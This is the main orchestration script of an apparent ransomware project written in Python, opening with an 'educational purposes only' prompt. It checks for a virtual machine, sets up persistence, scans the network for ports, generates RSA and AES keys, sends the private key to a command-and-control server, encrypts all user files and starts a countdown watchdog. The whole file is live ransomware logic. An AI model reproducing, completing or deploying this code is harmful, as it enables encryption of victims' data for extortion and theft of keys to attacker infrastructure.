import multiprocessing
from datetime import datetime, timedelta
from Core.Variables import seconds_left, timer_file_name, script_name_exe, script_name_elf, ports
from Crypto.Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
from Core.Timer import save_timer_data, watchdog_timer,load_timer_data
from Crypto.RSA_Key_Handling import send_private_key_to_c2
from System.Persistence import os_check
from System.VM_Check import running_in_vm
from Session.Session_Handling import get_session_token
from Network.Network import scan_network

####################################################################################################################

confirm = input("This software is for educational purposes only. Do you accept full responsibility for any misuse? (yes/no): ")
if confirm.lower() != 'yes':
    exit(1)
# Do not remove these lines
vm_check = running_in_vm()
if not vm_check:
    print("Running on metal") # Debug Message
    exit(1)
else:
    print("Running on vm") # Debug Message

# Quick check to see if timer data exist or not
timer_data = load_timer_data()
os_check(script_name_exe, script_name_elf)

if timer_data:
    print("Timer data exist") # Debug Message
    watchdog_process = multiprocessing.Process(target=watchdog_timer)
    watchdog_process.start()

else:
    scan_network(ports)
    print("No Timer Data Exist") # Debug Message
    # Next stage is file download into c2 server
    # Generate the RSA keys
    private_key, public_key = generate_rsa_keys()
    save_rsa_keys(private_key, public_key)

    # Generate the AES key
    symmetric_key = generate_symmetric_key()

    # Encrypt AES key with RSA public key and save it
    encrypted_aes_key = encrypt_aes_key_with_rsa(symmetric_key, public_key)
    save_encrypted_aes_key(encrypted_aes_key)

    get_session_token() # This will get the generate session token from the C2

    send_private_key_to_c2(private_key)

    # Encrypt all files
    encrypt_user_files(symmetric_key)

    start_time = datetime.now()
    expiration_time = start_time + timedelta(seconds=seconds_left)

    save_timer_data(start_time, expiration_time)

    watchdog_process = multiprocessing.Process(target=watchdog_timer)
    watchdog_process.start()

####################################################################################################################